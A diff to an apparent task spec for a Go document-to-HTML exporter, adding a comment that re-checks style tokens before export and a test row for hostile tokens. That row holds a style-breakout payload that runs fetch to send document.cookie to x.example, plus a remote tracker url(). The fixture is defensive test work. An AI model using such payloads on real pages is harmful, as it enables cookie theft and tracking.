@@ -61,6 +61,14 @@ func HTML(d *doc.Doc, nodeID string, o HTMLOptions) (string, error)
 //
 // assetPath maps an asset ref to the relative path the bundle writes it at
 // (task 21: "assets/<hex>.<ext>"). No script, no external URL, ever.
+//
+// Every token it writes into <style> is re-checked with dialect.Checker{}.TokenValue
+// first (review I2), and a refused one fails the export with dialect.ErrUnsafeToken
+// (task 07) wrapped with the token's name — never written, never silently dropped.
+// Apply refuses such a value already (task 06 set_token), but a document can reach
+// here without that check: store.Replay applies logged ops with an accept-everything
+// Checker (task 10), and a past revision is loaded from disk. This is the last Go
+// line before a browser.
 func ExportHTML(d *doc.Doc, artboardID string, assetPath func(ref string) string) (string, error)
 
 // TokensUsed is every token referenced by var(--x) in the subtree, plus the
@@ -146,6 +154,7 @@ digests match.
 | `TestHTML_escapes` | text `a < b & "c"` and a name with `"` serialise escaped and round-trip | unescaped text (a script vector on re-parse) |
 | `TestHTML_newlines` | text `"a\nb"` emits `a<br>b` | `\n` emitted raw (collapsed by the browser) |
 | `TestExportHTML_standalone` | the output has no `http`, no `src=` outside `assets/`, no `<script`, and one `:root` block with exactly the tokens used | an export that references the canvas |
+| `TestExportHTML_hostileToken` | a fixture document built through `Apply` with a permissive fake `Checker` (as `store.Replay` would), whose artboard uses `var(--brand)`, with `brand` (type `font-family`) set in turn to each of the review's two values — `red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>` and `url(https://tracker.example/p.png)` → an error that `errors.Is` `dialect.ErrUnsafeToken` and names `brand`, and no string returned; the same document with `brand` = `"Inter", sans-serif` exports | a script or a remote fetch in the bundle's `<slug>.html` the moment a person opens it (review I2) |
 | `TestTokensUsed_transitive` | `--a: var(--b)` used by a node yields `a` and `b` | nested tokens dropped from export |
 
 ## Steps
